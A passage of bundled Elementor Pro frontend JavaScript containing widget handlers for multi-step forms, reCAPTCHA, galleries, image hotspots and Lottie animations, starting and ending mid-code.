    this.elements.$stepWrapper.addClass(classes.hidden).eq(0).removeClass(classes.hidden);
  }

  resetIndicators() {
    const {
      classes
    } = this.getSettings(),
          stateTypes = ['inactive', 'active', 'completed'],
          stateClasses = stateTypes.map(state => classes.indicator + '--state-' + state);
    this.elements.$indicators.removeClass(stateClasses.join(' ')).not(this.elements.$indicators.eq(0)).addClass(classes.indicatorInactive);
    this.elements.$indicators.eq(0).addClass(classes.indicatorActive);
  }

  updateIndicatorsState(direction) {
    const {
      classes
    } = this.getSettings(),
          indicatorsClasses = {
      current: {
        remove: classes.indicatorActive,
        add: 'next' === direction ? classes.indicatorCompleted : classes.indicatorInactive
      },
      next: {
        remove: 'next' === direction ? classes.indicatorInactive : classes.indicatorCompleted,
        add: classes.indicatorActive
      }
    };
    this.elements.$currentIndicator.removeClass(indicatorsClasses.current.remove).addClass(indicatorsClasses.current.add);
    this.elements.$currentIndicator = this.elements.$indicators.eq(this.state.currentStep);
    this.elements.$currentIndicator.removeClass(indicatorsClasses.next.remove).addClass(indicatorsClasses.next.add); // Updating an indicator svg fill color, if loaded inside an object tag.

    this.data.indicatorsWithObjectTags.forEach($element => {
      $element.contents().children('svg').css('fill', $element.css('fill'));
    });
  }

  updateValue(updatedValue) {
    const actionsMap = {
      step_type: () => this.updateStepsType(),
      step_icon_shape: () => this.updateStepsShape(),
      step_next_label: () => this.updateStepButtonsLabel('next'),
      step_previous_label: () => this.updateStepButtonsLabel('previous')
    };

    if (actionsMap[updatedValue]) {
      actionsMap[updatedValue]();
    }
  }

  updateStepsType() {
    const stepsSettings = this.getElementSettings();

    if (this.elements.$indicatorsWrapper) {
      this.elements.$indicatorsWrapper.remove();
    }

    if ('none' !== stepsSettings.step_type) {
      this.rebuildIndicators();
    }

    this.state.stepsType = stepsSettings.step_type;
  }

  rebuildIndicators() {
    this.elements = { ...this.elements,
      ...this.createStepsIndicators()
    };
    this.initProgressBar();
  }

  updateStepsShape() {
    const stepsSettings = this.getElementSettings(),
          {
      selectors,
      classes
    } = this.getSettings(),
          shapeClassStart = classes.indicator + '--shape-',
          currentShapeClass = shapeClassStart + this.state.stepsShape,
          newShapeClass = shapeClassStart + stepsSettings.step_icon_shape;
    let elementsTargetType = '';

    if (stepsSettings.step_type.includes('icon')) {
      elementsTargetType = 'icon';
    } else if (stepsSettings.step_type.includes('number')) {
      elementsTargetType = 'number';
    }

    this.elements.$indicators.children(selectors.indicator + '__' + elementsTargetType).removeClass(currentShapeClass).addClass(newShapeClass);
    this.state.stepsShape = stepsSettings.step_icon_shape;
  }

  updateStepButtonsLabel(buttonType) {
    const {
      selectors
    } = this.getSettings(),
          buttonSelector = {
      previous: selectors.button + '-previous',
      next: selectors.button + '-next'
    };
    this.elements.$stepWrapper.each((index, el) => {
      jQuery(el).find(buttonSelector[buttonType]).text(this.getButtonLabel(buttonType, index));
    });
  }

  onFormError() {
    const {
      selectors
    } = this.getSettings(),
          $errorStepElement = this.elements.$form.find(selectors.formHelpInline).closest(selectors.stepWrapper);

    if ($errorStepElement.length) {
      this.goToStep($errorStepElement.index());
    }
  }

  onElementChange(updatedValue) {
    if (!this.isStepsExist()) {
      return;
    }

    this.updateValue(updatedValue);
  }

}

exports.default = FormSteps;

/***/ }),

/***/ "../modules/forms/assets/js/frontend/handlers/recaptcha.js":
/*!*****************************************************************!*\
  !*** ../modules/forms/assets/js/frontend/handlers/recaptcha.js ***!
  \*****************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

class Recaptcha extends elementorModules.frontend.handlers.Base {
  getDefaultSettings() {
    return {
      selectors: {
        recaptcha: '.elementor-g-recaptcha:last',
        submit: 'button[type="submit"]',
        recaptchaResponse: '[name="g-recaptcha-response"]'
      }
    };
  }

  getDefaultElements() {
    const {
      selectors
    } = this.getDefaultSettings(),
          elements = {
      $recaptcha: this.$element.find(selectors.recaptcha)
    };
    elements.$form = elements.$recaptcha.parents('form');
    elements.$submit = elements.$form.find(selectors.submit);
    return elements;
  }

  bindEvents() {
    this.onRecaptchaApiReady();
  }

  isActive(settings) {
    const {
      selectors
    } = this.getDefaultSettings();
    return settings.$element.find(selectors.recaptcha).length;
  }

  addRecaptcha() {
    const settings = this.elements.$recaptcha.data(),
          isV2 = 'v3' !== settings.type,
          captchaIds = [];
    captchaIds.forEach(id => window.grecaptcha.reset(id));
    const widgetId = window.grecaptcha.render(this.elements.$recaptcha[0], settings);
    this.elements.$form.on('reset error', () => {
      window.grecaptcha.reset(widgetId);
    });

    if (isV2) {
      this.elements.$recaptcha.data('widgetId', widgetId);
    } else {
      captchaIds.push(widgetId);
      this.elements.$submit.on('click', e => this.onV3FormSubmit(e, widgetId));
    }
  }

  onV3FormSubmit(e, widgetId) {
    e.preventDefault();
    window.grecaptcha.ready(() => {
      const $form = this.elements.$form;
      grecaptcha.execute(widgetId, {
        action: this.elements.$recaptcha.data('action')
      }).then(token => {
        if (this.elements.$recaptchaResponse) {
          this.elements.$recaptchaResponse.val(token);
        } else {
          this.elements.$recaptchaResponse = jQuery('<input>', {
            type: 'hidden',
            value: token,
            name: 'g-recaptcha-response'
          });
          $form.append(this.elements.$recaptchaResponse);
        } // Support old browsers.


        const bcSupport = !$form[0].reportValidity || 'function' !== typeof $form[0].reportValidity;

        if (bcSupport || $form[0].reportValidity()) {
          $form.trigger('submit');
        }
      });
    });
  }

  onRecaptchaApiReady() {
    if (window.grecaptcha && window.grecaptcha.render) {
      this.addRecaptcha();
    } else {
      // If not ready check again by timeout..
      setTimeout(() => this.onRecaptchaApiReady(), 350);
    }
  }

}

exports.default = Recaptcha;

/***/ }),

/***/ "../modules/gallery/assets/js/frontend/frontend-legacy.js":
/*!****************************************************************!*\
  !*** ../modules/gallery/assets/js/frontend/frontend-legacy.js ***!
  \****************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _handler = _interopRequireDefault(__webpack_require__(/*! ./handler */ "../modules/gallery/assets/js/frontend/handler.js"));

class _default extends elementorModules.Module {
  constructor() {
    super();
    elementorFrontend.elementsHandler.attachHandler('gallery', _handler.default);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/gallery/assets/js/frontend/handler.js":
/*!********************************************************!*\
  !*** ../modules/gallery/assets/js/frontend/handler.js ***!
  \********************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

class galleryHandler extends elementorModules.frontend.handlers.Base {
  getDefaultSettings() {
    return {
      selectors: {
        container: '.elementor-gallery__container',
        galleryTitles: '.elementor-gallery-title',
        galleryImages: '.e-gallery-image',
        galleryItemOverlay: '.elementor-gallery-item__overlay',
        galleryItemContent: '.elementor-gallery-item__content'
      },
      classes: {
        activeTitle: 'elementor-item-active'
      }
    };
  }

  getDefaultElements() {
    const {
      selectors
    } = this.getSettings(),
          elements = {
      $container: this.$element.find(selectors.container),
      $titles: this.$element.find(selectors.galleryTitles)
    };
    elements.$items = elements.$container.children();
    elements.$images = elements.$items.children(selectors.galleryImages);
    elements.$itemsOverlay = elements.$items.children(selectors.galleryItemOverlay);
    elements.$itemsContent = elements.$items.children(selectors.galleryItemContent);
    elements.$itemsContentElements = elements.$itemsContent.children();
    return elements;
  }

  getGallerySettings() {
    const settings = this.getElementSettings(),
          activeBreakpoints = elementorFrontend.config.responsive.activeBreakpoints,
          activeBreakpointsKeys = Object.keys(activeBreakpoints),
          breakPointSettings = {},
          desktopIdealRowHeight = elementorFrontend.getDeviceSetting('desktop', settings, 'ideal_row_height');
    activeBreakpointsKeys.forEach(breakpoint => {
      // The Gallery widget currently does not support widescreen.
      if ('widescreen' !== breakpoint) {
        const idealRowHeight = elementorFrontend.getDeviceSetting(breakpoint, settings, 'ideal_row_height');
        breakPointSettings[activeBreakpoints[breakpoint].value] = {
          horizontalGap: elementorFrontend.getDeviceSetting(breakpoint, settings, 'gap').size,
          verticalGap: elementorFrontend.getDeviceSetting(breakpoint, settings, 'gap').size,
          columns: elementorFrontend.getDeviceSetting(breakpoint, settings, 'columns'),
          idealRowHeight: idealRowHeight === null || idealRowHeight === void 0 ? void 0 : idealRowHeight.size
        };
      }
    });
    return {
      type: settings.gallery_layout,
      idealRowHeight: desktopIdealRowHeight === null || desktopIdealRowHeight === void 0 ? void 0 : desktopIdealRowHeight.size,
      container: this.elements.$container,
      columns: settings.columns,
      aspectRatio: settings.aspect_ratio,
      lastRow: 'normal',
      horizontalGap: elementorFrontend.getDeviceSetting('desktop', settings, 'gap').size,
      verticalGap: elementorFrontend.getDeviceSetting('desktop', settings, 'gap').size,
      animationDuration: settings.content_animation_duration,
      breakpoints: breakPointSettings,
      rtl: elementorFrontend.config.is_rtl,
      lazyLoad: 'yes' === settings.lazyload
    };
  }

  initGallery() {
    this.gallery = new EGallery(this.getGallerySettings());
    this.toggleAllAnimationsClasses();
  }

  removeAnimationClasses($element) {
    $element.removeClass((index, className) => (className.match(/elementor-animated-item-\S+/g) || []).join(' '));
  }

  toggleOverlayHoverAnimation() {
    this.removeAnimationClasses(this.elements.$itemsOverlay);
    const hoverAnimation = this.getElementSettings('background_overlay_hover_animation');

    if (hoverAnimation) {
      this.elements.$itemsOverlay.addClass('elementor-animated-item--' + hoverAnimation);
    }
  }

  toggleOverlayContentAnimation() {
    this.removeAnimationClasses(this.elements.$itemsContentElements);
    const contentHoverAnimation = this.getElementSettings('content_hover_animation');

    if (contentHoverAnimation) {
      this.elements.$itemsContentElements.addClass('elementor-animated-item--' + contentHoverAnimation);
    }
  }

  toggleOverlayContentSequencedAnimation() {
    this.elements.$itemsContent.toggleClass('elementor-gallery--sequenced-animation', 'yes' === this.getElementSettings('content_sequenced_animation'));
  }

  toggleImageHoverAnimation() {
    const imageHoverAnimation = this.getElementSettings('image_hover_animation');
    this.removeAnimationClasses(this.elements.$images);

    if (imageHoverAnimation) {
      this.elements.$images.addClass('elementor-animated-item--' + imageHoverAnimation);
    }
  }

  toggleAllAnimationsClasses() {
    const elementSettings = this.getElementSettings(),
          animation = elementSettings.background_overlay_hover_animation || elementSettings.content_hover_animation || elementSettings.image_hover_animation;
    this.elements.$items.toggleClass('elementor-animated-content', !!animation);
    this.toggleImageHoverAnimation();
    this.toggleOverlayHoverAnimation();
    this.toggleOverlayContentAnimation();
    this.toggleOverlayContentSequencedAnimation();
  }

  toggleAnimationClasses(settingKey) {
    if ('content_sequenced_animation' === settingKey) {
      this.toggleOverlayContentSequencedAnimation();
    }

    if ('background_overlay_hover_animation' === settingKey) {
      this.toggleOverlayHoverAnimation();
    }

    if ('content_hover_animation' === settingKey) {
      this.toggleOverlayContentAnimation();
    }

    if ('image_hover_animation' === settingKey) {
      this.toggleImageHoverAnimation();
    }
  }

  setGalleryTags(id) {
    this.gallery.setSettings('tags', 'all' === id ? [] : ['' + id]);
  }

  bindEvents() {
    this.elements.$titles.on('click', this.galleriesNavigationListener.bind(this));
  }

  galleriesNavigationListener(event) {
    const classes = this.getSettings('classes'),
          clickedElement = jQuery(event.target); // Make sure no other gallery title has an active class

    this.elements.$titles.removeClass(classes.activeTitle); // Give the gallery being activated the active class

    clickedElement.addClass(classes.activeTitle);
    this.setGalleryTags(clickedElement.data('gallery-index'));

    const updateLightboxGroup = () => this.setLightboxGalleryIndex(clickedElement.data('gallery-index')); // Wait for the gallery to filter before grouping items for the Light-box


    setTimeout(updateLightboxGroup, 1000);
  }

  setLightboxGalleryIndex(index = 'all') {
    if ('all' === index) {
      return this.elements.$items.attr('data-elementor-lightbox-slideshow', 'all_' + this.getID());
    }

    this.elements.$items.not('.e-gallery-item--hidden').attr('data-elementor-lightbox-slideshow', index + '_' + this.getID());
  }

  onInit(...args) {
    super.onInit(...args);

    if (elementorFrontend.isEditMode() && 1 <= this.$element.find('.elementor-widget-empty-icon').length) {
      this.$element.addClass('elementor-widget-empty');
    }

    if (!this.elements.$container.length) {
      return;
    }

    this.initGallery();
    this.elements.$titles.first().trigger('click');
  }

  getSettingsDictionary() {
    if (this.settingsDictionary) {
      return this.settingsDictionary;
    }

    const activeBreakpoints = elementorFrontend.config.responsive.activeBreakpoints,
          activeBreakpointsKeys = Object.keys(activeBreakpoints);
    const settingsDictionary = {
      columns: ['columns'],
      gap: ['horizontalGap', 'verticalGap'],
      ideal_row_height: ['idealRowHeight']
    };
    activeBreakpointsKeys.forEach(breakpoint => {
      // The Gallery widget currently does not support widescreen.
      if ('widescreen' === breakpoint) {
        return;
      }

      settingsDictionary['columns_' + breakpoint] = ['breakpoints.' + activeBreakpoints[breakpoint].value + '.columns'];
      settingsDictionary['gap_' + breakpoint] = ['breakpoints.' + activeBreakpoints[breakpoint].value + '.horizontalGap', 'breakpoints.' + activeBreakpoints[breakpoint].value + '.verticalGap'];
      settingsDictionary['ideal_row_height_' + breakpoint] = ['breakpoints.' + activeBreakpoints[breakpoint].value + '.idealRowHeight'];
    });
    settingsDictionary.aspect_ratio = ['aspectRatio'];
    this.settingsDictionary = settingsDictionary;
    return this.settingsDictionary;
  }

  onElementChange(settingKey) {
    if (-1 !== ['background_overlay_hover_animation', 'content_hover_animation', 'image_hover_animation', 'content_sequenced_animation'].indexOf(settingKey)) {
      this.toggleAnimationClasses(settingKey);
      return;
    }

    const settingsDictionary = this.getSettingsDictionary();
    const settingsToUpdate = settingsDictionary[settingKey];

    if (settingsToUpdate) {
      const gallerySettings = this.getGallerySettings();
      settingsToUpdate.forEach(settingToUpdate => {
        this.gallery.setSettings(settingToUpdate, this.getItems(gallerySettings, settingToUpdate));
      });
    }
  }

  onDestroy() {
    super.onDestroy();

    if (this.gallery) {
      this.gallery.destroy();
    }
  }

}

exports.default = galleryHandler;

/***/ }),

/***/ "../modules/hotspot/assets/js/frontend/frontend-legacy.js":
/*!****************************************************************!*\
  !*** ../modules/hotspot/assets/js/frontend/frontend-legacy.js ***!
  \****************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _hotspot = _interopRequireDefault(__webpack_require__(/*! ./handlers/hotspot */ "../modules/hotspot/assets/js/frontend/handlers/hotspot.js"));

class _default extends elementorModules.Module {
  constructor() {
    super();
    elementorFrontend.elementsHandler.attachHandler('hotspot', _hotspot.default);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/hotspot/assets/js/frontend/handlers/hotspot.js":
/*!*****************************************************************!*\
  !*** ../modules/hotspot/assets/js/frontend/handlers/hotspot.js ***!
  \*****************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

class Hotspot extends elementorModules.frontend.handlers.Base {
  getDefaultSettings() {
    return {
      selectors: {
        hotspot: '.e-hotspot',
        tooltip: '.e-hotspot__tooltip'
      }
    };
  }

  getDefaultElements() {
    const selectors = this.getSettings('selectors');
    return {
      $hotspot: this.$element.find(selectors.hotspot),
      $hotspotsExcludesLinks: this.$element.find(selectors.hotspot).filter(':not(.e-hotspot--no-tooltip)'),
      $tooltip: this.$element.find(selectors.tooltip)
    };
  }

  bindEvents() {
    const tooltipTrigger = this.getCurrentDeviceSetting('tooltip_trigger'),
          tooltipTriggerEvent = 'mouseenter' === tooltipTrigger ? 'mouseleave mouseenter' : tooltipTrigger;

    if (tooltipTriggerEvent !== 'none') {
      this.elements.$hotspotsExcludesLinks.on(tooltipTriggerEvent, event => this.onHotspotTriggerEvent(event));
    }
  }

  onDeviceModeChange() {
    this.elements.$hotspotsExcludesLinks.off();
    this.bindEvents();
  }

  onHotspotTriggerEvent(event) {
    const elementTarget = jQuery(event.target),
          isHotspotButtonEvent = elementTarget.closest('.e-hotspot__button').length,
          isTooltipMouseLeave = 'mouseleave' === event.type && (elementTarget.is('.e-hotspot--tooltip-position') || elementTarget.parents('.e-hotspot--tooltip-position').length),
          isMobile = 'mobile' === elementorFrontend.getCurrentDeviceMode(),
          isHotspotLink = elementTarget.closest('.e-hotspot--link').length,
          triggerTooltip = !(isHotspotLink && isMobile && ('mouseleave' === event.type || 'mouseenter' === event.type));

    if (triggerTooltip && (isHotspotButtonEvent || isTooltipMouseLeave)) {
      const currentHotspot = jQuery(event.currentTarget);
      this.elements.$hotspot.not(currentHotspot).removeClass('e-hotspot--active');
      currentHotspot.toggleClass('e-hotspot--active');
    }
  } // Fix bad UX of "Sequenced Animation" when editing other controls


  editorAddSequencedAnimation() {
    this.elements.$hotspot.toggleClass('e-hotspot--sequenced', 'yes' === this.getElementSettings('hotspot_sequenced_animation'));
  }

  hotspotSequencedAnimation() {
    const elementSettings = this.getElementSettings(),
          isSequencedAnimation = elementSettings.hotspot_sequenced_animation;

    if ('no' === isSequencedAnimation) {
      return;
    } //start sequenced animation when element on viewport


    const hotspotObserver = elementorModules.utils.Scroll.scrollObserver({
      callback: event => {
        if (event.isInViewport) {
          hotspotObserver.unobserve(this.$element[0]); //add delay for each hotspot

          this.elements.$hotspot.each((index, element) => {
            if (0 === index) {
              return;
            }

            const sequencedAnimation = elementSettings.hotspot_sequenced_animation_duration,
                  sequencedAnimationDuration = sequencedAnimation ? sequencedAnimation.size : 1000,
                  animationDelay = index * (sequencedAnimationDuration / this.elements.$hotspot.length);
            element.style.animationDelay = animationDelay + 'ms';
          });
        }
      }
    });
    hotspotObserver.observe(this.$element[0]);
  }

  setTooltipPositionControl() {
    const elementSettings = this.getElementSettings(),
          isDirectionAnimation = 'undefined' !== typeof elementSettings.tooltip_animation && elementSettings.tooltip_animation.match(/^e-hotspot--(slide|fade)-direction/);

    if (isDirectionAnimation) {
      this.elements.$tooltip.removeClass('e-hotspot--tooltip-animation-from-left e-hotspot--tooltip-animation-from-top e-hotspot--tooltip-animation-from-right e-hotspot--tooltip-animation-from-bottom');
      this.elements.$tooltip.addClass('e-hotspot--tooltip-animation-from-' + elementSettings.tooltip_position);
    }
  }

  onInit(...args) {
    super.onInit(...args);
    this.hotspotSequencedAnimation();
    this.setTooltipPositionControl();

    if (window.elementor) {
      elementor.listenTo(elementor.channels.deviceMode, 'change', () => this.onDeviceModeChange());
    }
  }

  onElementChange(propertyName) {
    if (propertyName.startsWith('tooltip_position')) {
      this.setTooltipPositionControl();
    }

    if (propertyName.startsWith('hotspot_sequenced_animation')) {
      this.editorAddSequencedAnimation();
    }
  }

}

exports.default = Hotspot;

/***/ }),

/***/ "../modules/lottie/assets/js/frontend/frontend-legacy.js":
/*!***************************************************************!*\
  !*** ../modules/lottie/assets/js/frontend/frontend-legacy.js ***!
  \***************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _handler = _interopRequireDefault(__webpack_require__(/*! ./handler */ "../modules/lottie/assets/js/frontend/handler.js"));

class _default extends elementorModules.Module {
  constructor() {
    super();
    elementorFrontend.elementsHandler.attachHandler('lottie', _handler.default);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/lottie/assets/js/frontend/handler.js":
/*!*******************************************************!*\
  !*** ../modules/lottie/assets/js/frontend/handler.js ***!
  \*******************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

class lottieHandler extends elementorModules.frontend.handlers.Base {
  getDefaultSettings() {
    return {
      selectors: {
        container: '.e-lottie__container',
        containerLink: '.e-lottie__container__link',
        animation: '.e-lottie__animation',
        caption: '.e-lottie__caption'
      },
      classes: {
        caption: 'e-lottie__caption'
      }
    };
  }

  getDefaultElements() {
    const {
      selectors
    } = this.getSettings();
    return {
      $widgetWrapper: this.$element,
      $container: this.$element.find(selectors.container),
      $containerLink: this.$element.find(selectors.containerLink),
      $animation: this.$element.find(selectors.animation),
      $caption: this.$element.find(selectors.caption),
      $sectionParent: this.$element.closest('.elementor-section'),
      $columnParent: this.$element.closest('.elementor-column')
    };
  }

  onInit(...args) {
    super.onInit(...args);
    this.lottie = null;
    this.state = {
      isAnimationScrollUpdateNeededOnFirstLoad: true,
      isNewLoopCycle: false,
      isInViewport: false,
      loop: false,
      animationDirection: 'forward',
      currentAnimationTrigger: '',
      effectsRelativeTo: '',
      hoverOutMode: '',
      hoverArea: '',
      caption: '',
      playAnimationCount: 0,
      animationSpeed: 0,
      linkTimeout: 0,
      viewportOffset: {
        start: 0,
        end: 100
      }
    };
    this.intersectionObservers = {
      animation: {
        observer: null,
        element: null
      },
      lazyload: {
        observer: null,
        element: null
      }
    };
    this.animationFrameRequest = {
      timer: null,
      lastScrollY: 0
    };
    this.listeners = {
      collection: [],
      elements: {
        $widgetArea: {
          triggerAnimationHoverIn: null,
          triggerAnimationHoverOut: null
        },
        $container: {
          triggerAnimationClick: null
        }
      }
    };
    this.initLottie();
  }

  initLottie() {
    const lottieSettings = this.getLottieSettings();

    if (lottieSettings.lazyload) {
      this.lazyloadLottie();
    } else {
      this.generateLottie();
    }
  }

  lazyloadLottie() {
    const bufferHeightBeforeTriggerLottie = 200;
    this.intersectionObservers.lazyload.observer = elementorModules.utils.Scroll.scrollObserver({
      offset: `0px 0px ${bufferHeightBeforeTriggerLottie}px`,
      callback: event => {
        if (event.isInViewport) {
          this.generateLottie();
          this.intersectionObservers.lazyload.observer.unobserve(this.intersectionObservers.lazyload.element);
        }
      }
    });
    this.intersectionObservers.lazyload.element = this.elements.$container[0];
    this.intersectionObservers.lazyload.observer.observe(this.intersectionObservers.lazyload.element);
  }

  generateLottie() {
    this.createLottieInstance();
    this.setLottieEvents();
  }

  createLottieInstance() {
    const lottieSettings = this.getLottieSettings();
    this.lottie = bodymovin.loadAnimation({
      container: this.elements.$animation[0],
      path: this.getAnimationPath(),
      renderer: lottieSettings.renderer,
      autoplay: false,
      // We always want to trigger the animation manually for considering start/end frame.
      name: 'lottie-widget'
    }); // Expose the lottie instance in the frontend.

    this.elements.$animation.data('lottie', this.lottie);
  }

  getAnimationPath() {
    var _lottieSettings$sourc, _lottieSettings$sourc2;

    const lottieSettings = this.getLottieSettings();

    if ((_lottieSettings$sourc = lottieSettings.source_json) !== null && _lottieSettings$sourc !== void 0 && _lottieSettings$sourc.url && 'json' === lottieSettings.source_json.url.toLowerCase().substr(-4)) {
      return lottieSettings.source_json.url;
    } else if ((_lottieSettings$sourc2 = lottieSettings.source_external_url) !== null && _lottieSettings$sourc2 !== void 0 && _lottieSettings$sourc2.url) {
      return lottieSettings.source_external_url.url;
    } // Default animation path.


    return elementorProFrontend.config.lottie.defaultAnimationUrl;
  }

  setCaption() {
    const lottieSettings = this.getLottieSettings();

    if ('external_url' === lottieSettings.source || 'media_file' === lottieSettings.source && 'custom' === lottieSettings.caption_source) {
      const $captionElement = this.getCaptionElement();
      $captionElement.text(lottieSettings.caption);
    }
  }

  getCaptionElement() {
    if (!this.elements.$caption.length) {
      const {
        classes
      } = this.getSettings();
      this.elements.$caption = jQuery('<p>', {
        class: classes.caption
      });
      this.elements.$container.append(this.elements.$caption);
      return this.elements.$caption;
    }

    return this.elements.$caption;
  }

  setLottieEvents() {
    this.lottie.addEventListener('DOMLoaded', () => this.onLottieDomLoaded());
    this.lottie.addEventListener('complete', () => this.onComplete());
  }

  saveInitialValues() {
    var _lottieSettings$play_;

    const lottieSettings = this.getLottieSettings();
    /*
    These values of the animation are being changed during the animation runtime
    and saved in the lottie instance (and not in the state) for the instance expose in the frontend.
     */

    this.lottie.__initialTotalFrames = this.lottie.totalFrames;
    this.lottie.__initialFirstFrame = this.lottie.firstFrame;
    this.state.currentAnimationTrigger = lottieSettings.trigger;
    this.state.effectsRelativeTo = lottieSettings.effects_relative_to;
    this.state.viewportOffset.start = lottieSettings.viewport ? lottieSettings.viewport.sizes.start : 0;
    this.state.viewportOffset.end = lottieSettings.viewport ? lottieSettings.viewport.sizes.end : 100;
    this.state.animationSpeed = (_lottieSettings$play_ = lottieSettings.play_speed) === null || _lottieSettings$play_ === void 0 ? void 0 : _lottieSettings$play_.size;
    this.state.linkTimeout = lottieSettings.link_timeout;
    this.state.caption = lottieSettings.caption;
    this.state.loop = lottieSettings.loop;
  }

  setAnimationFirstFrame() {
    const frame = this.getAnimationFrames();
    /*
    We need to subtract the initial first frame from the first frame for handling scenarios
    when the animation first frame is not 0, this way we always get the relevant first frame.
    example: when start point is 70 and initial first frame is 60, the animation should start at 10.
     */

    frame.first = frame.first - this.lottie.__initialFirstFrame;
    this.lottie.goToAndStop(frame.first, true);
  }

  initAnimationTrigger() {
    const lottieSettings = this.getLottieSettings();

    switch (lottieSettings.trigger) {
      case 'none':
        this.playLottie();
        break;

      case 'arriving_to_viewport':
        this.playAnimationWhenArrivingToViewport();
        break;

      case 'bind_to_scroll':
        this.playAnimationWhenBindToScroll();
        break;

      case 'on_click':
        this.bindAnimationClickEvents();
        break;

      case 'on_hover':
        this.bindAnimationHoverEvents();
        break;
    }
  }

  playAnimationWhenArrivingToViewport() {
    const offset = this.getOffset();
    this.intersectionObservers.animation.observer = elementorModules.utils.Scroll.scrollObserver({
      offset: `${offset.end}% 0% ${offset.start}%`,
      callback: event => {
        if (event.isInViewport) {
          this.state.isInViewport = true;
          this.playLottie();
        } else {
          this.state.isInViewport = false;
          this.lottie.pause();
        }
      }
    });
    this.intersectionObservers.animation.element = this.elements.$widgetWrapper[0];
    this.intersectionObservers.animation.observer.observe(this.intersectionObservers.animation.element);
  }

  getOffset() {
    const lottieSettings = this.getLottieSettings(),
          start = -lottieSettings.viewport.sizes.start || 0,
          end = -(100 - lottieSettings.viewport.sizes.end) || 0;
    return {
      start,
      end
    };
  }

  playAnimationWhenBindToScroll() {
    const lottieSettings = this.getLottieSettings(),
          offset = this.getOffset(); // Generate scroll detection by Intersection Observer API

    this.intersectionObservers.animation.observer = elementorModules.utils.Scroll.scrollObserver({
      offset: `${offset.end}% 0% ${offset.start}%`,
      callback: event => this.onLottieIntersection(event)
    });
    this.intersectionObservers.animation.element = 'viewport' === lottieSettings.effects_relative_to ? this.elements.$widgetWrapper[0] : document.documentElement;
    this.intersectionObservers.animation.observer.observe(this.intersectionObservers.animation.element);
  }

  updateAnimationByScrollPosition() {
    const lottieSettings = this.getLottieSettings();
    let percentage;

    if ('page' === lottieSettings.effects_relative_to) {
      percentage = this.getLottiePagePercentage();
    } else if ('fixed' === this.getCurrentDeviceSetting('_position')) {
      percentage = this.getLottieViewportHeightPercentage();
    } else {
      percentage = this.getLottieViewportPercentage();
    }

    let nextFrameToPlay = this.getFrameNumberByPercent(percentage);
    nextFrameToPlay = nextFrameToPlay - this.lottie.__initialFirstFrame;
    this.lottie.goToAndStop(nextFrameToPlay, true);
  }

  getLottieViewportPercentage() {
    return elementorModules.utils.Scroll.getElementViewportPercentage(this.elements.$widgetWrapper, this.getOffset());
  }

  getLottiePagePercentage() {
    return elementorModules.utils.Scroll.getPageScrollPercentage(this.getOffset());
  }

  getLottieViewportHeightPercentage() {
    return elementorModules.utils.Scroll.getPageScrollPercentage(this.getOffset(), window.innerHeight);
  }
  /**
   * @param {number} percent - Percent value between 0-100
   */


  getFrameNumberByPercent(percent) {
    const frame = this.getAnimationFrames();
    /*
    In mobile devices the document height can be 'stretched' at the top and bottom points of the document,
    this 'stretched' will make percent to be either negative or larger than 100, therefore we need to limit percent between 0-100.
    */

    percent = Math.min(100, Math.max(0, percent)); // Getting frame number by percent of range, considering start/end frame values if exist.

    return frame.first + (frame.last - frame.first) * percent / 100;
  }

  getAnimationFrames() {
    const lottieSettings = this.getLottieSettings(),
          currentFrame = this.getAnimationCurrentFrame(),
          startPoint = this.getAnimationRange().start,
          endPoint = this.getAnimationRange().end;
    let firstFrame = this.lottie.__initialFirstFrame,
        lastFrame = 0 === this.lottie.__initialFirstFrame ? this.lottie.__initialTotalFrames : this.lottie.__initialFirstFrame + this.lottie.__initialTotalFrames; // Limiting min start point to animation first frame.

    if (startPoint && startPoint > firstFrame) {
      firstFrame = startPoint;
    } // limiting max end point to animation last frame.


    if (endPoint && endPoint < lastFrame) {
      lastFrame = endPoint;
    }
    /*
    Getting the relevant first frame after loop complete and when not bind to scroll.
    when the animation is in progress (no when a new loop start), the first frame should be the current frame.
    when the trigger is bind_to_scroll we DON'T need to get this functionality.
    */


    if (!this.state.isNewLoopCycle && 'bind_to_scroll' !== lottieSettings.trigger) {
      // When we have a custom start point, we need to check if the start point is larger than the last pause stop of the animation.
      firstFrame = startPoint && startPoint > currentFrame ? startPoint : currentFrame;
    } // Reverse Mode.


    if ('backward' === this.state.animationDirection && this.isReverseMode()) {
      firstFrame = currentFrame;
      lastFrame = startPoint && startPoint > this.lottie.__initialFirstFrame ? startPoint : this.lottie.__initialFirstFrame;
    }

    return {
      first: firstFrame,
      last: lastFrame,
      current: currentFrame,
      total: this.lottie.__initialTotalFrames
    };
  }

  getAnimationRange() {
    const lottieSettings = this.getLottieSettings();
    return {
      start: this.getInitialFrameNumberByPercent(lottieSettings.start_point.size),
      end: this.getInitialFrameNumberByPercent(lottieSettings.end_point.size)
    };
  }

  getInitialFrameNumberByPercent(percent) {
    percent = Math.min(100, Math.max(0, percent));
